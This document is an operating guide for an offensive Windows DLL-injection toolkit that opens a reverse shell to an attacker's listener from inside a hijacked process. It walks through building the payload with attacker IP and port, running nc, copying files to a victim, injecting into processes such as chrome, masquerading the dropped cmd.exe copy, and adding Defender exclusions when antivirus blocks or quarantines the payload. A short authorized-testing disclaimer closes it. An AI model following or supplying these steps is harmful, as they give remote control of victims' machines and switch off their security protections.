# SOP — process-injection-2

Standard operating procedure for `pop.exe` + `revshell_pure_dll.dll`.

---

## 1. What this tool does

A two-piece Windows DLL-injection toolkit for thick-client / red-team testing.

| Piece | Role |
|---|---|
| `pop_x64.exe` / `pop_x86.exe` | **Injector.** Picks a target process by PID or name, writes a remote buffer, kicks a remote thread at `kernel32!LoadLibraryA`. Also does shellcode-only modes (MessageBox, spawn child). |
| `revshell_pure_dll.dll` | **Payload DLL.** Opens a WinSock reverse shell to `LHOST:LPORT` from inside the host process. Drops a renamed copy of `cmd.exe` (`revShell.exe`), patches its `FileDescription` so it shows up in Task Manager as something identifiable. |
| `build_revshell_dll.sh` | **Interactive Linux builder** for the DLL. Prompts LHOST/LPORT (with validation), picks arch from a menu, cross-compiles with MinGW (auto-installs) or llvm-mingw (auto-downloads). |

MITRE ATT&CK: **T1055.001** (DLL injection), **T1055.002** (shellcode via CreateRemoteThread), **T1036** (masquerading).

---

## 2. Capabilities at a glance

- **4 injection modes** — `--dll <path>` (reverse shell), `--spawn <program>` (child process), `--msg "text"` (MessageBox banner), default MessageBox
- **Two injector architectures** — `pop_x64.exe` + `pop_x86.exe` — matches the target's bitness
- **Auto DLL-arch switch** — pass either DLL; if the target is x86 and you handed it the x64 DLL, pop will auto-find a sibling x86 DLL in the same folder
- **Identifiable child process** — patched `FileDescription` + renamed image, so the hijacked `cmd.exe` doesn't look generic in Task Manager
- **Dotted step log** — every API call shows `[N] func(args) ....... ok <value>` with real handles, addresses, HMODULE
- **Validated inputs** — build script rejects malformed IPs/ports before producing a broken DLL
- **Auto-install / auto-download** — build script installs `mingw-w64` on first use and downloads `llvm-mingw` for ARM64 targets
- **Colored output** (auto-off when piped) with `--no-color` flag

---

## 3. Quick start

### On Kali (attacker) — build the DLL

```bash
git clone https://github.com/m14r41/PayloadEverything.git
cd PayloadEverything/thick-client/process-injection-2
./build_revshell_dll.sh
```

The script prompts for:
- **LHOST** — your attacker IP (defaults to your current interface IP)
- **LPORT** — listener port (default 4444)
- **Arch** — `1) x64   2) x86   3) ARM64   4) all three`

Writes `reverse-shell/revshell_<arch>.dll`. Remembers your last answers in `build_revshell_dll.conf`.

Standalone mode: download just the `.sh` and run it anywhere — it auto-fetches the `.cpp` source:

```bash
curl -O https://raw.githubusercontent.com/m14r41/PayloadEverything/main/thick-client/process-injection-2/build_revshell_dll.sh
chmod +x build_revshell_dll.sh
./build_revshell_dll.sh
```

### Start the listener

```bash
nc -lvnp 4444
```

### On victim — inject

Copy `pop_x64.exe` + both DLLs into a folder on the victim. Then:

```powershell
cd C:\Users\<you>\Downloads
pop_x64.exe <target_PID_or_name> --dll revshell_x64.dll
```

Shell lands on the attacker.

---

## 4. Modes

### `--dll` — reverse shell (primary use case)

```powershell
pop_x64.exe 1234 --dll revshell_x64.dll
pop_x64.exe MVTC --dll revshell_x64.dll
pop_x64.exe chrome --dll revshell_x64.dll
```

### `--spawn` — spawn a child process in the target's context

Common small apps as children of the target (good for PoC screenshots — the parent-child tree in Task Manager is the proof):

```powershell
pop_x64.exe <target> --spawn calc.exe
pop_x64.exe <target> --spawn notepad.exe
pop_x64.exe <target> --spawn mspaint.exe
pop_x64.exe <target> --spawn cmd.exe
pop_x64.exe <target> --spawn powershell.exe
pop_x64.exe <target> --spawn "cmd /k whoami"
pop_x64.exe <target> --spawn "cmd /k systeminfo"
```

### `--msg` — visible MessageBox inside the target

```powershell
pop_x64.exe explorer                       # default banner
pop_x64.exe explorer "I was here"          # custom text
pop_x64.exe 1234 "PWNED by m14r41"
```

### `--list` — discover injectable targets

```powershell
pop_x64.exe --list
```

Lists every PID you have `PROCESS_ALL_ACCESS` on, with name, user, memory, UI flag. Sorted by biggest working-set first.

---

## 5. Example output

### Success — DLL injection

```
C:\Users\admin\Downloads> pop_x64.exe 7936 --dll revshell_x64.dll

[+] target
    - PID 7936, name MVTC.exe, arch x64
    - user HACKER-DC\Admin, memory 234.2 MB

[+] payload
    - revshell_x64.dll (x64, 134 KB)
    - C:\Users\admin\Downloads\revshell_x64.dll

    [1]  OpenProcess(7936, PROCESS_ALL_ACCESS)  .........  ok   handle 0xC8
    [2]  VirtualAllocEx(42, RW)  ........................  ok   0x1DAE7FA0000
    [3]  WriteProcessMemory(0x1DAE7FA0000, path, 42)  ...  ok   42 B
    [4]  GetProcAddress(kernel32, LoadLibraryA)  ........  ok   0x7FF8D5CB01F0
    [5]  CreateRemoteThread(entry=[4], arg=[2])  ........  ok   tid 0x104
    [6]  GetExitCodeThread  ............................  ok   HMODULE 0xC22F0000

[+] success  DLL loaded inside MVTC.exe (PID 7936)
```

### MessageBox payload rendered inside the host

```
[T1055] Process injection into MVTC.exe (PID 4124) - successful.

This dialog is running inside the host process, not the injector.
Shellcode was written to the target with WriteProcessMemory and
executed via CreateRemoteThread.
```

Title bar: `Process Injection Successful!`

### Failure examples (built-in guidance)

Invalid PID:
```
[+] target
    - PID 999999 (resolving...)

    [1]  OpenProcess(999999, PROCESS_ALL_ACCESS)  .......  fail err 87

[!] failed   step [1] - ERROR_INVALID_PARAMETER (PID does not exist)
[*] hint     pop.exe --list    pop.exe <name>
[*] top 5 live PIDs:
      9780    claude.exe                     784.6 MB
      4300    firefox.exe                    330.6 MB
      ...
```

Arch mismatch — DLL won't load into target:
```
[!] failed   architecture mismatch: target is x86 (WOW64), DLL is x64
[*] hint     rebuild the DLL for x86 (WOW64)
```
*(Auto-recovers if a sibling DLL with the right arch sits in the same folder.)*

Access denied — need Administrator:
```
[!] failed   step [1] - ERROR_ACCESS_DENIED
[*] hint     run cmd as Administrator, or pick a process you own
```

---

## 6. Troubleshooting

| Symptom | Most likely cause | Fix |
|---|---|---|
| `[!] OpenProcess err 5` | Target process is higher integrity | Run cmd/pop as Administrator |
| `[!] OpenProcess err 87` | PID doesn't exist / wrong digit | Use `pop_x64.exe --list` or inject by name |
| `[!] CreateRemoteThread err 5` | EDR / Defender blocked remote-thread creation | Add a Defender folder exclusion for your Downloads path |
| `[+] success` but **no shell lands** | Defender quarantined the dropped `revShell.exe` | `Add-MpPreference -ExclusionPath "$env:USERPROFILE"` from an Admin shell |
| `[+] success` but no shell, AND `strings dll \| grep <IP>` shows nothing | LHOST in the DLL is wrong/empty — rebuild | On Kali: `rm build_revshell_dll.conf; ./build_revshell_dll.sh` and retype the IP carefully |
| `HMODULE 0` from LoadLibraryA | DLL is wrong arch / missing dep / Defender ate it | Match arch with target; add Defender exclusion |
| MessageBox doesn't appear | Target has no user32 loaded (console-only) OR session 0 isolation | Use `--spawn` or `--dll` instead |

### Pre-injection sanity check (do this every time)

```bash
# on attacker (Kali) - before shipping DLL to victim
strings -a revshell_x64.dll | grep -E '192\.|10\.'
# must print your real LHOST IP
```

```powershell
# on victim - before injecting
Test-NetConnection <attacker_IP> -Port 4444
# TcpTestSucceeded : True   means the DLL's connect() will reach the listener
```

---

## 7. File layout

```
process-injection-2/
├── pop.cpp                     injector source
├── pop_x64.exe                 x64 injector (Windows)
├── pop_x86.exe                 x86 injector (Windows)
├── build_revshell_dll.sh       interactive Linux DLL builder
├── sop.md                      this document
└── reverse-shell/
    ├── revshell_pure_dll.cpp   payload DLL source (edit LHOST/LPORT here)
    ├── revshell_pure_dll.dll   x64 build (MSVC)
    ├── revshell_x86.dll        x86 build (MSVC)
    └── build.ps1               Windows one-shot build helper
```

---

## 8. Compatibility matrix

| Target | Injector | DLL | Works out of the box |
|---|---|---|---|
| x64 app (chrome, notepad, Office, any modern Win app) | `pop_x64.exe` | `revshell_pure_dll.dll` / `revshell_x64.dll` | yes |
| x86 WOW64 app (Lightshot, old installers) | `pop_x86.exe` | `revshell_x86.dll` | yes |
| ARM64 (Surface Pro X, Dev Kit) | — *(pop ARM64 build pending)* | `revshell_arm64.dll` (build with script) | DLL only |
| Protected-process / system service | — | — | no (expected) |

For a lab CTF: shipping x64 + x86 covers ~100% of what you'll meet.

---

## 9. Legal

Authorized testing only. Running against systems you don't own or weren't given explicit written permission to test is a crime in most jurisdictions. Author assumes no liability for misuse.
